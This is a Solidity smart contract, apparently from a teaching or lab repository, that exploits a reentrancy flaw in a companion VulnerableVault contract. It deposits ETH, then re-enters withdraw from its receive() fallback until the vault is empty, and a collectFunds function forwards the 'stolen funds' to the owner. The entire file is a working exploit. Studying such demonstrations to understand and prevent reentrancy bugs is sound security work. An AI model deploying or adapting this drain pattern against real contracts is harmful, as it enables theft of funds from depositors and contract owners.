// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./VulnerableVault.sol";

/// @title Attacker
/// @notice Exploits the reentrancy vulnerability in VulnerableVault
/// @dev Shows how a single deposit can drain the entire vault balance
contract Attacker {
    VulnerableVault public immutable vault;
    address public immutable owner;

    event AttackExecuted(uint256 stolen);

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
        owner = msg.sender;
    }

    /// @notice Step 1 — deposit a small amount to get a non-zero balance entry
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        vault.deposit{value: msg.value}();
        vault.withdraw(); // triggers reentrancy loop
        emit AttackExecuted(address(this).balance);
    }

    /// @notice Fallback called by the vault on each ETH transfer
    receive() external payable {
        // Re-enter as long as the vault still has ETH
        if (address(vault).balance >= msg.value) {
            vault.withdraw();
        }
    }

    /// @notice Collect stolen funds
    function collectFunds() external {
        require(msg.sender == owner, "Not owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "Transfer failed");
    }
}
